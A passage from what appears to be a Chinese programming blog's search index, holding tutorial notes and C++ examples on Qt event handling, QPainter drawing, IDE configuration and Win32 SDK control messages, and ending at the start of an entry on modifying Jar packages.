","date":"2021-10-13","objectID":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/:20:2","tags":["Qt"],"title":"Qt","uri":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/"},{"categories":["界面编程"],"content":"源码 Qt菜单.7z ","date":"2021-10-13","objectID":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/:20:3","tags":["Qt"],"title":"Qt","uri":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/"},{"categories":["界面编程"],"content":"Qt事件 重载Qt事件有2种方式: 重载event这个虚函数,在里面判断event的类型, 重载各自的事件虚函数(如 keyPressEvent). ","date":"2021-10-13","objectID":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/:21:0","tags":["Qt"],"title":"Qt","uri":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/"},{"categories":["界面编程"],"content":"QEvent 重载事件 virtual bool event(QEvent *event) override; 示例 //声明 public: //重载event bool event(QEvent* ev); //实现 bool LuoEvent::event(QEvent* ev) { switch (ev-\u003etype()) { case QEvent::KeyPress: { //键盘事件 //推荐重载keyPressEvent或keyReleaseEvent QKeyEvent* keyEv = (QKeyEvent*)ev; //判断是否是自动触发的 if (!keyEv-\u003eisAutoRepeat()) { //这个输出的是大写 qDebug() \u003c\u003c (char)keyEv-\u003ekey(); //这个可以区分大小写 qDebug() \u003c\u003c keyEv-\u003etext(); if (keyEv-\u003ekey() == 'A') { //返回true表示已被处理 return true; } } } case QEvent::MouseButtonPress: { //鼠标事件 QMouseEvent* me = (QMouseEvent*)ev; //相对坐标(本地坐标) qDebug() \u003c\u003c \"QEvent::MouseButtonPress \" \u003c\u003c QStringLiteral(\"相对坐标 \") \u003c\u003c me-\u003ex() \u003c\u003c me-\u003ey(); //程序窗口坐标 qDebug() \u003c\u003c \"QEvent::MouseButtonPress \" \u003c\u003c QStringLiteral(\"程序窗口坐标 \") \u003c\u003c me-\u003ewindowPos().x() \u003c\u003c me-\u003ewindowPos().y(); //屏幕坐标 qDebug() \u003c\u003c \"QEvent::MouseButtonPress \" \u003c\u003c QStringLiteral(\"屏幕坐标 \") \u003c\u003c me-\u003escreenPos().x() \u003c\u003c me-\u003escreenPos().y(); //本地坐标转屏幕坐标 QPoint gPos = mapToGlobal(me-\u003epos()); qDebug() \u003c\u003c \"QEvent::MouseButtonPress \" \u003c\u003c QStringLiteral(\"本地坐标转屏幕坐标 \") \u003c\u003c gPos.x() \u003c\u003c gPos.y(); //获取鼠标的屏幕坐标 qDebug() \u003c\u003c \"QCursor\" \u003c\u003c QCursor::pos().x() \u003c\u003c QCursor::pos().y(); //鼠标按钮事件 if (me-\u003ebuttons() \u0026 Qt::LeftButton) { qDebug() \u003c\u003c \"LeftButton\"; } if (me-\u003ebuttons() \u0026 Qt::RightButton) { qDebug() \u003c\u003c \"RightButton\"; } if (me-\u003ebuttons() \u0026 Qt::MiddleButton) { qDebug() \u003c\u003c \"MiddleButton\"; } } case QEvent::Resize: { //窗口大小改变事件 QResizeEvent* re = (QResizeEvent*)ev; qDebug() \u003c\u003c \"Resize Old \" \u003c\u003c re-\u003eoldSize() \u003c\u003c \"Resize New \" \u003c\u003c re-\u003esize(); } default: break; } return QWidget::event(ev); } ","date":"2021-10-13","objectID":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/:21:1","tags":["Qt"],"title":"Qt","uri":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/"},{"categories":["界面编程"],"content":"键盘事件 重载事件 virtual void keyPressEvent(QKeyEvent *event); virtual void keyReleaseEvent(QKeyEvent *event); 示例 //声明 public: //键盘事件 void keyPressEvent(QKeyEvent* ev); void keyReleaseEvent(QKeyEvent* ev); //实现 void LuoEvent::keyPressEvent(QKeyEvent* ev) { //键盘按下某个按键后,会多次响应 //解决键盘按钮连发现象,判断是否是自动触发的,若是则返回 if (ev-\u003eisAutoRepeat()) { return; } qDebug() \u003c\u003c \"keyPressEvent \" \u003c\u003c ev-\u003ekey(); } void LuoEvent::keyReleaseEvent(QKeyEvent* ev) { if (ev-\u003eisAutoRepeat()) { return; } qDebug() \u003c\u003c \"keyReleaseEvent \" \u003c\u003c ev-\u003ekey(); } ","date":"2021-10-13","objectID":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/:21:2","tags":["Qt"],"title":"Qt","uri":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/"},{"categories":["界面编程"],"content":"鼠标事件 重载事件 //鼠标移进来 virtual void enterEvent(QEvent *event); //鼠标移出去 virtual void leaveEvent(QEvent *event); virtual void mouseDoubleClickEvent(QMouseEvent *event); //鼠标移动事件,需要开启鼠标跟踪,setMouseTracking(true) virtual void mouseMoveEvent(QMouseEvent *event); virtual void mousePressEvent(QMouseEvent *event); virtual void mouseReleaseEvent(QMouseEvent *event); 坐标 //相对坐标(本地坐标) //相对于Widget的位置 int QMouseEvent::x() const; int QMouseEvent::y() const; //程序窗口坐标 //相对于程序窗口的位置 const QPointF \u0026QMouseEvent::windowPos() const; //屏幕坐标 //相对于屏幕的位置 const QPointF \u0026QMouseEvent::screenPos() const; //本地坐标转屏幕坐标 QPoint mapToGlobal(const QPoint \u0026pos) const; //获取鼠标的屏幕坐标 [static] QPoint QCursor::pos(); 按键 //获取按键状态,鼠标的哪个键被按下 Qt::MouseButtons QMouseEvent::buttons() const; enum MouseButton { NoButton = 0x00000000, LeftButton = 0x00000001, RightButton = 0x00000002, MidButton = 0x00000004, // ### Qt 6: remove me MiddleButton = MidButton, ... }; ","date":"2021-10-13","objectID":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/:21:3","tags":["Qt"],"title":"Qt","uri":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/"},{"categories":["界面编程"],"content":"窗口大小改变 可重载该事件来解决不同电脑屏幕分辨率不同,而导致的控件显示异常的现象. 重载事件 virtual void resizeEvent(QResizeEvent *event); 示例 //声明 public: //窗口大小改变事件 void resizeEvent(QResizeEvent* re); //实现 void LuoEvent::resizeEvent(QResizeEvent* re) { qDebug() \u003c\u003c \"resizeEvent\"; //窗口改变前的大小 //re-\u003eoldSize() //窗口改变后的大小 //re-\u003esize() } ","date":"2021-10-13","objectID":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/:21:4","tags":["Qt"],"title":"Qt","uri":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/"},{"categories":["界面编程"],"content":"源代码 Qt事件.7z ","date":"2021-10-13","objectID":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/:21:5","tags":["Qt"],"title":"Qt","uri":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/"},{"categories":["界面编程"],"content":"QPainter ","date":"2021-10-13","objectID":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/:22:0","tags":["Qt"],"title":"Qt","uri":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/"},{"categories":["界面编程"],"content":"重载事件 virtual void paintEvent(QPaintEvent *event); ","date":"2021-10-13","objectID":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/:22:1","tags":["Qt"],"title":"Qt","uri":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/"},{"categories":["界面编程"],"content":"绘制文本 //声明 public: //重载这个虚函数 void paintEvent(QPaintEvent* event); //实现 void LuoPaint::paintEvent(QPaintEvent* event) { //设置绘制设备 (Widget) QPainter p(this); //设置画笔颜色 p.setPen(QColor(255, 0, 0, 200)); //设置字体 //p.setFont(QFont(QStringLiteral(\"黑体\"), 30)); //这样设置之后,我们在字体选中控件中选择字体后,界面的绘制的字体没有改变 //我们需要调用update这个槽函数,来刷新界面 QFont font = ui.fontComboBox-\u003ecurrentFont(); font.setPixelSize(30); p.setFont(font); //绘制文本 p.drawText(100, 100, QStringLiteral(\"测试文字\")); } 需要注意的是,我们通过字体选择控件选择字体后,需要调update这个槽函数来刷新界面. ","date":"2021-10-13","objectID":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/:22:2","tags":["Qt"],"title":"Qt","uri":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/"},{"categories":["界面编程"],"content":"绘制线 //声明 public: //重载这个虚函数 void paintEvent(QPaintEvent* event); //实现 void LuoPaint::paintEvent(QPaintEvent* event) { //设置绘制设备 (Widget) QPainter p(this); //绘制线 //设置画笔样式 QPen pen; //实线 pen.setStyle(Qt::SolidLine); //线粗 pen.setWidth(30); //线刷子 pen.setBrush(Qt::red); //结尾端样式 pen.setCapStyle(Qt::RoundCap); //连接处样式 pen.setJoinStyle(Qt::RoundJoin); p.setPen(pen); QVector\u003cQLine\u003e lines; lines.push_back(QLine(0, 0, 350, 350)); lines.push_back(QLine(350, 350, 0, 450)); lines.push_back(QLine(0, 450, 550, 550)); p.drawLines(lines); p.end(); } ","date":"2021-10-13","objectID":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/:22:3","tags":["Qt"],"title":"Qt","uri":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/"},{"categories":["界面编程"],"content":"Qt配置 ","date":"2021-10-13","objectID":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/:23:0","tags":["Qt"],"title":"Qt","uri":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/"},{"categories":["界面编程"],"content":"VS2019黑色方案 VS2019dark.xml 将上述黑色方案放到Qt目录\\Tools\\QtCreator\\share\\qtcreator\\styles. 在QtCreator中工具-\u003e选项-\u003e环境-\u003etheme,选择dark. 在QtCreator中工具-\u003e选项-\u003e文本编辑器,选择VS2019. ","date":"2021-10-13","objectID":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/:23:1","tags":["Qt"],"title":"Qt","uri":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/"},{"categories":["界面编程"],"content":"控制台 方便调试,看输出信息. QtCreator VS ","date":"2021-10-13","objectID":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/:23:2","tags":["Qt"],"title":"Qt","uri":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/"},{"categories":["界面编程"],"content":"VS番茄插件设置 ","date":"2021-10-13","objectID":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/:23:3","tags":["Qt"],"title":"Qt","uri":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/"},{"categories":["界面编程"],"content":"环境变量 添加环境变量: Qt_INCLUDEPATH_ = D:\\QT\\5.12.10\\msvc2017_64\\include 按上述设置后,可解决某些情况下在VS中写Qt代码不提示,工程标红等现象. ","date":"2021-10-13","objectID":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/:23:4","tags":["Qt"],"title":"Qt","uri":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/"},{"categories":["界面编程"],"content":"VS工程标红 右键.ui文件,编译. 右键解决方案,重新扫描解决方案. ","date":"2021-10-13","objectID":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/:23:5","tags":["Qt"],"title":"Qt","uri":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/"},{"categories":["界面编程"],"content":"Qss //声明 public slots: //设置皮肤样式 static void SetStyle(const QString\u0026 styleName); //实现 void luoQt::SetStyle(const QString\u0026 styleName) { QFile file(QString(\"./image/%1.qss\").arg(styleName)); bool b = file.open(QFile::ReadOnly); QString qss = QLatin1String(file.readAll()); qApp-\u003esetStyleSheet(qss); qApp-\u003esetPalette(QPalette(QColor(\"#F0F0F0\"))); } Qss.7z ","date":"2021-10-13","objectID":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/:24:0","tags":["Qt"],"title":"Qt","uri":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/"},{"categories":["界面编程"],"content":"Qt程序打包 将Qt程序单独放到一个文件夹中,cmd到该文件夹,执行下面的命令. windeployqt 程序名 ","date":"2021-10-13","objectID":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/:25:0","tags":["Qt"],"title":"Qt","uri":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/qt/"},{"categories":["界面编程"],"content":"Sdk ","date":"2021-10-13","objectID":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/sdk/:0:0","tags":["Sdk"],"title":"Sdk","uri":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/sdk/"},{"categories":["界面编程"],"content":"消息 ","date":"2021-10-13","objectID":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/sdk/:1:0","tags":["Sdk"],"title":"Sdk","uri":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/sdk/"},{"categories":["界面编程"],"content":"N(notify) 通知,通告,控件发送给使用者 ","date":"2021-10-13","objectID":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/sdk/:1:1","tags":["Sdk"],"title":"Sdk","uri":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/sdk/"},{"categories":["界面编程"],"content":"M(message) 发送给控件,用于修改和控制控件的消息 ","date":"2021-10-13","objectID":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/sdk/:1:2","tags":["Sdk"],"title":"Sdk","uri":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/sdk/"},{"categories":["界面编程"],"content":"查看控件消息 依次在MSDN中打开Platform SDK Documentation/User Interface Services/Windows User Interface/Controls ","date":"2021-10-13","objectID":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/sdk/:2:0","tags":["Sdk"],"title":"Sdk","uri":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/sdk/"},{"categories":["界面编程"],"content":"Button case WM_COMMAND: { WORD wID = LOWORD(wParam);//低位表示控件ID WORD wMsg = HIWORD(wParam);//高位表示消息 if (wMsg == BN_CLICKED) { switch (wID) { case BUT_TEST1: MessageBox(hwndDlg, \"按钮1按下\", \"Luo\", MB_OK); break; case BUT_TEST2: { MessageBox(hwndDlg, \"按钮2按下\", \"Luo\", MB_OK); HWND hWnBut1 = GetDlgItem(hwndDlg, BUT_TEST1); SendMessage(hWnBut1, BM_CLICK, 0, 0); break; } } } return true; } ","date":"2021-10-13","objectID":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/sdk/:3:0","tags":["Sdk"],"title":"Sdk","uri":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/sdk/"},{"categories":["界面编程"],"content":"Edit Control ","date":"2021-10-13","objectID":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/sdk/:4:0","tags":["Sdk"],"title":"Sdk","uri":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/sdk/"},{"categories":["界面编程"],"content":"支持换行 Multiline设置为true Want Return设置为true ","date":"2021-10-13","objectID":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/sdk/:4:1","tags":["Sdk"],"title":"Sdk","uri":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/sdk/"},{"categories":["界面编程"],"content":"获取文本 EM_GETLINE case WM_COMMAND: { WORD wID = LOWORD(wParam);//低位表示控件ID WORD wMsg = HIWORD(wParam);//高位表示消息 if (wMsg == BN_CLICKED) { switch (wID) { case BUT_GETTEXT: { CHAR szBuf[MAXBYTE] = \"0\"; HWND hWndEdit = GetDlgItem(hwndDlg, EDIT_TEST); SendMessage(hWndEdit, EM_GETLINE, 0, (LPARAM)szBuf); MessageBox(hwndDlg, szBuf, \"Luo\", MB_OK); break; } } } return true; } WM_GETTEXT case WM_COMMAND: { WORD wID = LOWORD(wParam);//低位表示控件ID WORD wMsg = HIWORD(wParam);//高位表示消息 if (wMsg == BN_CLICKED) { switch (wID) { case BUT_GETTEXT: { CHAR szBuf[MAXBYTE] = \"0\"; HWND hWndEdit = GetDlgItem(hwndDlg, EDIT_TEST); SendMessage(hWndEdit, WM_GETTEXT, MAXBYTE, (LPARAM)szBuf); MessageBox(hwndDlg, szBuf, \"Luo\", MB_OK); break; } } } return true; } SendDlgItemMessage case WM_COMMAND: { WORD wID = LOWORD(wParam);//低位表示控件ID WORD wMsg = HIWORD(wParam);//高位表示消息 if (wMsg == BN_CLICKED) { switch (wID) { case BUT_GETTEXT: { CHAR szBuf[MAXBYTE] = \"0\"; SendDlgItemMessage(hwndDlg, //对话框句柄 EDIT_TEST, //控件ID WM_GETTEXT, //消息 MAXBYTE, (LPARAM)szBuf); MessageBox(hwndDlg, szBuf, \"Luo\", MB_OK); break; } } } return true; } GetWindowText case WM_COMMAND: { WORD wID = LOWORD(wParam);//低位表示控件ID WORD wMsg = HIWORD(wParam);//高位表示消息 if (wMsg == BN_CLICKED) { switch (wID) { case BUT_GETTEXT: { CHAR szBuf[MAXBYTE] = \"0\"; HWND hWndEdit = GetDlgItem(hwndDlg, EDIT_TEST); GetWindowText(hWndEdit, szBuf, sizeof(szBuf)); MessageBox(hwndDlg, szBuf, \"Luo\", MB_OK); break; } } } return true; } GetDlgItemText case WM_COMMAND: { WORD wID = LOWORD(wParam);//低位表示控件ID WORD wMsg = HIWORD(wParam);//高位表示消息 if (wMsg == BN_CLICKED) { switch (wID) { case BUT_GETTEXT: { CHAR szBuf[MAXBYTE] = \"0\"; GetDlgItemText(hwndDlg, EDIT_TEST, szBuf, sizeof(szBuf)); MessageBox(hwndDlg, szBuf, \"Luo\", MB_OK); break; } } } return true; } ","date":"2021-10-13","objectID":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/sdk/:4:2","tags":["Sdk"],"title":"Sdk","uri":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/sdk/"},{"categories":["界面编程"],"content":"设置文本 case WM_COMMAND: { WORD wID = LOWORD(wParam);//低位表示控件ID WORD wMsg = HIWORD(wParam);//高位表示消息 if (wMsg == BN_CLICKED) { switch (wID) { case BUT_SETTEXT: { char szBuf[] = \"XiaLuoHun\"; SetDlgItemText(hwndDlg, EDIT_TEST, szBuf); break; } } } return true; } ","date":"2021-10-13","objectID":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/sdk/:4:3","tags":["Sdk"],"title":"Sdk","uri":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/sdk/"},{"categories":["界面编程"],"content":"Check Box 在MSDN中查看BUTTON消息 ","date":"2021-10-13","objectID":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/sdk/:5:0","tags":["Sdk"],"title":"Sdk","uri":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/sdk/"},{"categories":["界面编程"],"content":"BM_GETCHECK 判断复选框是否被选中 若被选中,则返回BST_CHECKED ","date":"2021-10-13","objectID":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/sdk/:5:1","tags":["Sdk"],"title":"Sdk","uri":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/sdk/"},{"categories":["界面编程"],"content":"Radio Button 在MSDN中查看BUTTON消息 ","date":"2021-10-13","objectID":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/sdk/:6:0","tags":["Sdk"],"title":"Sdk","uri":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/sdk/"},{"categories":["界面编程"],"content":"BM_GETCHECK 判断单选框是否被选中 若被选中,则返回BST_CHECKED ","date":"2021-10-13","objectID":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/sdk/:6:1","tags":["Sdk"],"title":"Sdk","uri":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/sdk/"},{"categories":["界面编程"],"content":"Combo Box ","date":"2021-10-13","objectID":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/sdk/:7:0","tags":["Sdk"],"title":"Sdk","uri":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/sdk/"},{"categories":["界面编程"],"content":"CB_ADDSTRING 向组合框中加内容 ","date":"2021-10-13","objectID":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/sdk/:7:1","tags":["Sdk"],"title":"Sdk","uri":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/sdk/"},{"categories":["界面编程"],"content":"CB_SETCURSEL 设置组合框默认选项 case WM_INITDIALOG: { //向组合框中加内容 SendDlgItemMessage(hwndDlg, CMB_TEST, CB_ADDSTRING, 0, (LPARAM)\"LuoHun\"); SendDlgItemMessage(hwndDlg, CMB_TEST, CB_ADDSTRING, 0, (LPARAM)\"ShiTou\"); //设置组合框默认选项 SendDlgItemMessage(hwndDlg, CMB_TEST, CB_SETCURSEL, 0, 0); return true; } ","date":"2021-10-13","objectID":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/sdk/:7:2","tags":["Sdk"],"title":"Sdk","uri":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/sdk/"},{"categories":["界面编程"],"content":"CB_GETCURSEL 获取当前组合框选中项的索引 ","date":"2021-10-13","objectID":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/sdk/:7:3","tags":["Sdk"],"title":"Sdk","uri":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/sdk/"},{"categories":["界面编程"],"content":"CB_GETLBTEXT 根据索引值,获取组合框中的文本 case WM_COMMAND: { WORD wID = LOWORD(wParam);//低位表示控件ID WORD wMsg = HIWORD(wParam);//高位表示消息 if (wMsg == BN_CLICKED) { switch (wID) { case BUT_GETTEXT: { //获取组合框中当前选中项的索引值 HWND hWndComBox = GetDlgItem(hwndDlg, CMB_TEST); int nCurIdx = SendMessage(hWndComBox, CB_GETCURSEL, 0, 0); //获取组合框选中项的文本 char szBuf[MAXBYTE] = \"0\"; SendMessage(hWndComBox, CB_GETLBTEXT, nCurIdx, (LPARAM)szBuf); MessageBox(hwndDlg, szBuf, \"Luo\", MB_OK); break; } } } return true; } ","date":"2021-10-13","objectID":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/sdk/:7:4","tags":["Sdk"],"title":"Sdk","uri":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/sdk/"},{"categories":["界面编程"],"content":"通用控件 ","date":"2021-10-13","objectID":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/sdk/:8:0","tags":["Sdk"],"title":"Sdk","uri":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/sdk/"},{"categories":["界面编程"],"content":"特点 需包头文件 #include \u003ccommctrl.h\u003e#pragma comment(lib,\"comctl32.lib\") 响应消息 WM_NOTIFY ","date":"2021-10-13","objectID":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/sdk/:8:1","tags":["Sdk"],"title":"Sdk","uri":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/sdk/"},{"categories":["界面编程"],"content":"List Control 设置整行选中 //获取句柄 HWND hListCtrl = GetDlgItem(hwndDlg, EXPORT_LISTCTRL); //设置整行选中 SendMessage(hListCtrl, LVM_SETEXTENDEDLISTVIEWSTYLE, 0, LVS_EX_FULLROWSELECT); 插入表头 //插入表头 LV_COLUMN lv; memset(\u0026lv, 0, sizeof(lv)); //第一列 lv.mask = LVCF_TEXT | LVCF_WIDTH | LVCF_SUBITEM; lv.pszText = TEXT(\"序号\"); lv.cx = 50; lv.iSubItem = 0; SendMessage(hListCtrl, LVM_INSERTCOLUMN, 0, (DWORD)\u0026lv); //第二列 lv.pszText = TEXT(\"RVA\"); lv.cx = 80; lv.iSubItem = 1; ListView_InsertColumn(hListCtrl, 1, \u0026lv); 添加数据 LV_ITEM vitem; memset(\u0026vitem, 0, sizeof(LV_ITEM)); //插入序号 CHAR szBuf[MAXBYTE] = \"0\"; vitem.mask = LVIF_TEXT; DWORD dwOrdinalAddBase = dwOrdinal + pExportDirectory-\u003eBase; sprintf_s(szBuf, \"%04X\", dwOrdinalAddBase); vitem.pszText = szBuf; vitem.iItem = i;//行 vitem.iSubItem = 0;//列 ListView_InsertItem(hListCtrl, \u0026vitem); //插入RVA sprintf_s(szBuf, \"%08X\", dwFuncRva); vitem.pszText = szBuf; vitem.iItem = i;//行 vitem.iSubItem = 1;//列 ListView_SetItem(hListCtrl, \u0026vitem); 获取选中行信息 //获取列表控件句柄 HWND hLstCtrlSection = GetDlgItem(hwndDlg, RELOCATION_LSTCTRL_SECTION); LV_ITEM vitem; //初始化 memset(\u0026vitem, 0, sizeof(LV_ITEM)); //获取当前选中行的序号 DWORD dwIdx = SendMessage(hLstCtrlSection, LVM_GETSELECTIONMARK, 0, 0); //获取当前选中行的信息第1列信息 CHAR szBuf[MAXBYTE] = \"0\"; vitem.mask = TVIF_TEXT | TVIF_PARAM;//设置哪些成员是有效的 vitem.pszText = szBuf; vitem.cchTextMax = sizeof(szBuf); vitem.iItem = dwIdx;//选中行 vitem.iSubItem = 1;//第1列 BOOL bRet = ListView_GetItem(hLstCtrlSection, \u0026vitem); if (bRet == FALSE) { return FALSE; } ","date":"2021-10-13","objectID":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/sdk/:8:2","tags":["Sdk"],"title":"Sdk","uri":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/sdk/"},{"categories":["界面编程"],"content":"Tree Control 设置风格 //获取树控件的句柄 HWND hwndTree = GetDlgItem(hwndDlg, RESOURCE_TREE); //设置树控件的风格 DWORD dwStyle = GetWindowLong(hwndTree, GWL_STYLE); dwStyle = dwStyle | TVS_HASLINES | TVS_LINESATROOT | TVS_HASBUTTONS | TVS_SHOWSELALWAYS; SetWindowLong(hwndTree, GWL_STYLE, dwStyle); 添加数据 CHAR szBuf[MAXBYTE] = \"LuoHun\";//缓冲区 HTREEITEM hFirstItem;//保存结点句柄 TVITEM tvItem = { 0 };//结点 tvItem.mask = TVIF_TEXT | TVIF_STATE | TVIF_PARAM;//设置哪些成员是有效的 tvItem.cchTextMax = sizeof(szBuf); tvItem.pszText = szBuf; tvItem.lParam = (LPARAM)pFirstResDirEntry;//附加数据 TVINSERTSTRUCT tvStruct = { 0 }; tvStruct = { 0 }; tvStruct.hParent = TVI_ROOT; tvStruct.item = tvItem; hFirstItem = TreeView_InsertItem(hwndTree, \u0026tvStruct); 获取选中结点信息 响应消息 case WM_NOTIFY: { NMHDR* pNmhdr = (NMHDR*)lParam; NMTREEVIEW* pnmtv = (LPNMTREEVIEW)lParam; if (wParam == RESOURCE_TREE \u0026\u0026 pNmhdr-\u003ecode == TVN_SELCHANGED \u0026\u0026 pnmtv-\u003eaction == TVC_BYMOUSE) { //给对话框相关控件赋值 FillResourceTableDlg(hwndDlg); } return TRUE; } FillResourceTableDlg //获取树控件句柄 HWND hTree = GetDlgItem(hwndDlg, RESOURCE_TREE); //获取选中结点句柄 HTREEITEM hTreeItem = TreeView_GetSelection(hTree); //给tvItem赋值 CHAR szBuf[MAXBYTE] = \"0\";//缓冲区 TVITEM tvItem = { 0 };//结点 tvItem.mask = TVIF_TEXT | TVIF_PARAM ;//设置哪些成员是有效的 tvItem.hItem = hTreeItem; tvItem.pszText = szBuf; tvItem.cchTextMax = sizeof(szBuf); //tvItem是一个传入传出参数,获取选中项数据 BOOL bRet = TreeView_GetItem(hTree, \u0026tvItem); if (bRet == FALSE) { return FALSE; } ","date":"2021-10-13","objectID":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/sdk/:8:3","tags":["Sdk"],"title":"Sdk","uri":"/posts/%E7%95%8C%E9%9D%A2%E7%BC%96%E7%A8%8B/sdk/"},{"categories":["奇技淫巧"],"content":"Jar包修改 首先需要配置好Java环境. ","date":"2021-10-01","objectID":"/posts/%E5%A5%87%E6%8A%80%E6%B7%AB%E5%B7%A7/jar%E5%8C%85%E4%BF%AE%E6%94%B9/:0:0","tags":["Jar"],"title":"Jar包修改","uri":"/posts/%E5%A5%87%E6%8A%80%E6%B7%AB%E5%B7%A7/jar%E5%8C%85%E4%BF%AE%E6%94%B9/"},{"categories":["奇技淫巧"],"content":"Java版本 